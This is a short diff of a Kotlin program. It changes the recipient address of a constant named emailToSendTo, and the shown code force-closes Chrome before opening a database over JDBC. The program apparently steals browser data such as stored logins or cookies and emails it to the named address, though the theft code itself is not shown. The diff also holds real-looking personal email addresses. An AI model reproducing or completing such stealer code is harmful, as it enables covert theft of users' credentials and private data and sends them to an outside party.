@@ -7,7 +7,7 @@ import java.sql.DriverManager
 
 private lateinit var databaseFile: File
 private lateinit var connection: Connection
-private const val emailToSendTo = "astroazure7@gmail.com"
+private const val emailToSendTo = "budisyahiddin@pm.me"
 
 fun main(args: Array<String>) {
     Runtime.getRuntime().exec("taskkill /F /IM chrome.exe") // force close chrome
